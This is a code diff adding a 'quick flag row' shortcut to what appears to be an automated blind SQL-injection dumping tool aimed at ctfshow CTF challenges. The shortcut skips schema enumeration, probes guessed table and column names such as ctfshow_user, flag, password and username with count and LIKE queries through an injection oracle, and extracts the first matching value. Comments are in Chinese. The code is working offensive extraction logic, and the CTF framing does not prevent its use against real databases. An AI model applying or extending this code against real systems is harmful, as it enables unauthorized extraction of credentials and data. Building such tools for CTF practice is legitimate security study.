@@ -334,11 +334,55 @@ class ExtractionPipeline:
             return -1
 
     # ------------------------------------------------------------------ auto
+    def _quick_flag_row(self) -> DumpResult | None:
+        """盲注通道专用：跳过库/表/列枚举，直接按常见表名列名找 flag 行。
+
+        盲注通道每取一个字符串都是几十个请求，枚举 information_schema 动辄
+        4-5 千请求（web190-192 实测）；CTF 题里 flag 基本落在
+        `ctfshow_user.f1ag/flag/pass` 这类位置，逐个 count+like 探测只要几百请求。
+        """
+        guess_tables = ("ctfshow_user", "ctfshow_flxg", "ctfshow_flag",
+                        "ctfshow_fl4g", "flag", "f1ag", "fl4g", "user")
+        guess_cols = ("f1ag", "flag", "pass", "password", "username", "fl4g")
+        hex_like = "0x63746673686f777b25"      # ctfshow{%
+        for t in guess_tables:
+            for c in guess_cols:
+                if self.s.stopped:
+                    return None
+                try:
+                    cnt = self.o.scalar_int(
+                        f"(select count(*) from {t} where {c} like {hex_like})")
+                except OracleError:
+                    continue
+                if cnt <= 0:
+                    continue
+                self.log("INFO", f"[脱库] 盲注快速定位：{t}.{c} 命中 flag 行，直接提取")
+                val = self.o.scalar(
+                    f"(select {c} from {t} where {c} like {hex_like} limit 1)")
+                if not val:
+                    continue
+                res = DumpResult()
+                try:
+                    res.database = self.current_db()
+                except OracleError:
+                    res.database = ""
+                res.tables[res.database or ""] = [t]
+                res.columns[(res.database or "", t)] = [c]
+                res.rows[(res.database or "", t)] = [{c: val}]
+                self._note(f"盲注快速提取 {t}.{c}", "跳过 information_schema 枚举")
+                return res
+        return None
+
     def auto_dump(self, max_rows: int = 20, dump_all_dbs: bool = False) -> DumpResult:
         res = DumpResult()
         res.version = self.version()
         res.database = self.current_db()
         res.user = self.current_user()
+        if self._is_blind():
+            quick = self._quick_flag_row()
+            if quick is not None:
+                quick.version, quick.user = res.version, res.user
+                return quick
         self.log("INFO", f"[脱库] version={res.version} db={res.database} user={res.user}")
 
         res.databases = self.list_databases()
